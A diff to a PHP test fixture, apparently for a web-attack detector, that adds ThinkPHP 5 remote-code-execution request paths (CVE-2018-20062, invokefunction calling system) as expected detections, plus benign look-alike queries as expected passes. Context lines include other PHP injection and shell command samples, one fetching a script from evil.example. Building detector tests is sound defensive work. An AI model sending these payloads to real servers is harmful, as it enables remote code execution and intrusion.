@@ -122,6 +122,9 @@ return [
             ['/?a=assert($_POST[x])', [], 'ATK-PHP'],
             ['/?a=shell_exec(%27id%27)', [], 'ATK-PHP'],
             ['/?a=gzinflate($x)', [], 'ATK-PHP'],
+            ['/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id', [], 'ATK-PHP'],   // ThinkPHP 5 (CVE-2018-20062)
+            ['/index.php?s=index/think%5CContainer/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1', [], 'ATK-PHP'],
+            ['/index.php?s=/index/%5Cthink%5Crequest/input&filter=system&data=id', [], 'ATK-PHP'],   // the same way in, without invokefunction
             ['/?cmd=;cat+/var/log/x', [], 'ATK-SHELL'],
             ['/?cmd=a%7Cwget+http://evil.example/x.sh', [], 'ATK-SHELL'],
             ['/?cmd=$(id)', [], 'ATK-SHELL'],
@@ -270,6 +273,8 @@ return [
             '/?q=formaction%3Dsave',                 // the word without a tag
             '/?q=%3Cb%3Eformaction%3D%3C/b%3E',      // the tag closed before it
             '/?q=bash%20/dev/tcp%20tutorial',        // the device named, no host and port
+            '/?q=invokefunction',                    // the word alone: a search
+            '/?q=think%20about%20it&ns=App%5CThink',  // "think" as a word, a namespace that ends in it
             '/?f=/dev/tcpdump/1',                    // another word
             '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
             '/?t=10:30:00&o=1',                      // times, a parameter called o
